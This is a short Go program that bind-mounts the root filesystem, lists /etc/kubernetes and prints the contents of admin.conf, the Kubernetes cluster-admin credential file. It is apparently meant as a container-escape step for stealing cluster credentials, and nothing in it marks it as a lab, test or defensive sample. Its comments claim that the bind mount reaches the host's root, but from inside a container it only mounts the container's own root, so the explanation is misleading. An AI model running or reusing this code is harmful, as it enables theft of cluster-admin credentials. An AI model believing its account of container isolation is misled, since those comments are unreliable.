package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"
)

func main() {
	// Define the host's /etc/kubernetes path
	hostPath := "/etc/kubernetes"

	// Create a temporary mount point in the container
	mountPoint := "/mnt/host-etc-kubernetes"
	if err := os.MkdirAll(mountPoint, 0755); err != nil {
		fmt.Printf("Error creating mount point: %v\n", err)
		return
	}

	// Mount the host's root filesystem
	if err := syscall.Mount("/", mountPoint, "none", syscall.MS_BIND|syscall.MS_REC, ""); err != nil {
		fmt.Printf("Error mounting host root: %v\n", err)
		return
	}
	defer syscall.Unmount(mountPoint, 0) // Cleanup

	// Construct the full path to the host's /etc/kubernetes
	fullHostPath := filepath.Join(mountPoint, hostPath)

	// Read the directory contents
	files, err := ioutil.ReadDir(fullHostPath)
	if err != nil {
		fmt.Printf("Error reading directory: %v\n", err)
		return
	}

	// Print the contents
	fmt.Printf("Contents of %s on host:\n", hostPath)
	for _, file := range files {
		fmt.Println(file.Name())
	}

	// Example: Read a specific file
	adminConfPath := filepath.Join(fullHostPath, "admin.conf")
	if content, err := ioutil.ReadFile(adminConfPath); err == nil {
		fmt.Printf("\nContents of admin.conf:\n%s\n", string(content))
	} else {
		fmt.Printf("Error reading admin.conf: %v\n", err)
	}
}
